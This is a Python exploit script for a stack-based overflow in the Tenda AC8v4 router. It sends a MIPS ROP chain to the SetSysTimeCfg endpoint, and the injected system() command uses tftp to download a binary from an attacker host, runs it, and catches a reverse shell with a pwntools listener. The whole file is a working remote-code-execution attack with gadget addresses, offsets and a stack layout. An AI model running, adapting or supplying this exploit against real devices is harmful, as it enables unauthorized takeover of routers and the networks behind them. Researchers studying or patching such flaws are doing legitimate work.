#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#File: rop.py
#Author: Patrick Peng (retr0reg)

import requests
import argparse
import threading
from pwn import log, context, flat, listen
from typing import NamedTuple

session = requests.Session()
session.trust_env = False

def ap():    
    parser = argparse.ArgumentParser()
    parser.add_argument("host",type=str,
                    help="exploiting ip")
    parser.add_argument("port",type=int,
                    help="exploiting port")
    parser.add_argument(
        "attacker_host",
        help="attacker host"
    )
    args = parser.parse_args()
    return ['',f'tftp -g -r rs {args.attacker_host} && chmod +x rs && ./rs {args.attacker_host} 9000'], args.host, args.port


class RopCmd(NamedTuple):
    second: str


def pwn(
        ropcmd: RopCmd,
        host: str = '192.168.31.106',
        port: int = 80,
    ):

    listener = listen(9000)
    context(arch = 'mips',endian = 'little',os = 'linux')

    def sink(
        payload
    ):    
        url = f"http://{host}:{port}/goform/SetSysTimeCfg"
        _payload = b''
        _payload = b'retr0reg' + b":" + payload
        data = {
            b"timeType":b"manual",
            b"time":_payload
        }

        def send_request():
            try:
                requests.post(url=url, data=data)
            except Exception as e:
                print(f"Request failed: {e}")

        thread = threading.Thread(target=send_request)
        thread.start()

    def _rop(ropcmd: RopCmd):

        # rop-chain:
        # lw $s4 0x48; jr 0x5c
        # move $t9,$s4; jr 0x34($sp)
        # addiu $a0,$sp,0x28+var_C | jr 0x24($sp)
        # 

        # 77f59000-77fe5000 r-xp 00000000 08:01 788000 
        libc_base       = 0x77f59000        
        _system         = 0x004E630

        t9_target       = 0x77fa7630
        ret_offset      = 0x7b #  -> b'bgaa'
        sp_offset       = 0x7f # --> b'bhaa'

        sp2             = 0x60  # LOAD:0007EB7C 
        sp3             = 0x38  # LOAD:0001B038 

        print('\n')

        log.success("Exploit started!")
        log.info(f"retaddr offset: {hex(ret_offset)}")
        log.info(f"$sp offset: {hex(sp_offset)}")
        log.info(f"libc_base -> {hex(libc_base)}")

        lw_s4_0x48_JR_5Csp    = 0x0007E8C8 # lw $s4,0x38+var_s10($sp) | jr 0x5C($sp)
        # LOAD:0007E8CC                 move    $v0, $s0
        # LOAD:0007E8D0                 lw      $fp, 0x38+var_s20($sp)
        # LOAD:0007E8D4                 lw      $s7, 0x38+var_s1C($sp)
        # LOAD:0007E8D8                 lw      $s6, 0x38+var_s18($sp)
        # LOAD:0007E8DC                 lw      $s5, 0x38+var_s14($sp)
        # LOAD:0007E8E0                 lw      $s4, 0x38+var_s10($sp)
        # LOAD:0007E8E4                 lw      $s3, 0x38+var_sC($sp)
        # LOAD:0007E8E8                 lw      $s2, 0x38+var_s8($sp)
        # LOAD:0007E8EC                 lw      $s1, 0x38+var_s4($sp)
        # LOAD:0007E8F0                 lw      $s0, 0x38+var_s0($sp)
        # LOAD:0007E8F4                 jr      $ra
        # LOAD:0007E8F8                 addiu   $sp, 0x60

        t9_EQ_s4_JR_1C_p_18   = 0x0001B014 # move $t9,$s4             | jr 0x1C+0x18($sp)
        # LOAD:0001B018                 lw      $ra, 0x1C+var_s18($sp)
        # LOAD:0001B01C                 lw      $s5, 0x1C+var_s14($sp)
        # LOAD:0001B020                 lw      $s4, 0x1C+var_s10($sp)
        # LOAD:0001B024                 lw      $s3, 0x1C+var_sC($sp)
        # LOAD:0001B028                 lw      $s2, 0x1C+var_s8($sp)
        # LOAD:0001B02C                 lw      $s1, 0x1C+var_s4($sp)
        # LOAD:0001B030                 lw      $s0, 0x1C+var_s0($sp)
        # LOAD:0001B034                 jr      $ra
        # LOAD:0001B038                 addiu   $sp, 0x38

        a0_EQ_sp24_c_JR_24sp  = 0x0004D144 # addiu $a0,$sp,0x24+var_C | jr 0x24($sp)
        # LOAD:0004D144                 addiu   $a0, $sp, 0x24+var_C
        # LOAD:0004D148                 lw      $ra, 0x24+var_s0($sp)
        # LOAD:0004D14C                 nop
        # LOAD:0004D150                 jr      $ra


        a0_EQ_sp28_c_JR_24sp  = 0x00058920 # addiu $a0,$sp,0x28+var_C | jr 0x24($sp)
        # LOAD:00058920                 addiu   $a0, $sp, 0x28+var_C
        # LOAD:00058924                 lw      $v1, 0x28+var_C($sp)
        # LOAD:00058928                 lw      $ra, 0x28+var_4($sp)
        # LOAD:0005892C                 sw      $v1, 0($s0)
        # LOAD:00058930                 lw      $s0, 0x28+var_8($sp)
        # LOAD:00058934                 jr      $ra

        print('')
        log.success("Ropping....")
        log.info(f"gadget lw_s4_0x48_JR_5Csp   -> {hex(libc_base + lw_s4_0x48_JR_5Csp)}")
        log.info(f"gadget t9_EQ_s4_JR_1C_p_18  -> {hex(libc_base + t9_EQ_s4_JR_1C_p_18)}")
        log.info(f"gadget a0_EQ_sp24_c_JR_24sp -> {hex(libc_base + a0_EQ_sp24_c_JR_24sp)}")
        log.info(f"_system                     -> {hex(libc_base + _system)}")

        c1 = ""
        c2 = ""

        c3 = "output=$(tftp 2>&1);spec=${output:47:1};" + ropcmd[1].replace('-','$(echo $spec)')

        log.info(f"Inject $a0: {c3}")

        _payload = {
                ret_offset: libc_base + lw_s4_0x48_JR_5Csp, # flow1
                (sp_offset + 0x48): t9_target,
                (sp_offset + 0x38 + 0x18): f'{c2}'.encode(), # $s6, 0x38+var_s18($sp)
                (sp_offset + 0x5c): libc_base + t9_EQ_s4_JR_1C_p_18, # flow2
                (sp_offset + sp2 + 0x1C + 0x10): f'{c1}'.encode(), # flow2 $s4-$s5 (caller), this is set via previous control-ed registers
                (sp_offset + sp2 + 0x34): libc_base + a0_EQ_sp24_c_JR_24sp, 
                (sp_offset + sp2 + sp3 + 0x24): libc_base + _system, # flow3
                (sp_offset + sp2 + sp3 + 0x24 + 0xC - 0x7): f'$({c3});'.encode()
            }

        print('')
        log.success("Stack looks like:")
        for key, value in _payload.items():
            try:
                log.info(f"offset: {hex(key)} : {hex(value)}")
            except TypeError:
                pass

        # $sp growth  -> +0x60 -> 0x38 
        #
        # | retaddr             | lw_s4_0x48_JR_5Csp   |  i. (gadget address) 
        # | (current sp)        |                      |     ($spsz1=0d127)
        # | $sp1+0x48           | t9_target            |  i ->  $s4  
        # | $sp2+0x5c           | t9_EQ_s4_JR_1C_p_18  |  ii <- $t9 ($spsz2+=0x60)
        # | $sp1+$sp2+$sp3-0xC  | command              |  <- $a0
        # | $sp1+$sp2+0x34      | a0_EQ_sp24_c_JR_24sp |  iii. ($spsz3+=38)
        # | $sp1+$sp2+$sp3+0x24 | _system              |  <- jmp

        return flat(_payload)

    payload = _rop(ropcmd)
    sink(payload=payload)

    print('')
    listener.wait_for_connection()
    log.critical("Recieved shell!")
    listener.interactive()

if __name__ == "__main__":
    ropcmd, host, port = ap()
    log.info("0reg.dev - retr0reg")
    log.info("Tenda AC8v4 stack-based overflow")
    print('')
    print(
        """\
        __________        __          _______                        
        \______   \ _____/  |________ \   _  \_______   ____   ____  
        |       _// __ \   __\_  __ \/  /_\  \_  __ \_/ __ \ / ___\ 
        |    |   \  ___/|  |  |  | \/\  \_/   \  | \/\  ___// /_/  >
        |____|_  /\___  >__|  |__|    \_____  /__|    \___  >___  / 
                \/     \/                    \/            \/_____/  
        """
    )
    log.info("RCE via Mipsel ROP")
    pwn(ropcmd, host, port)
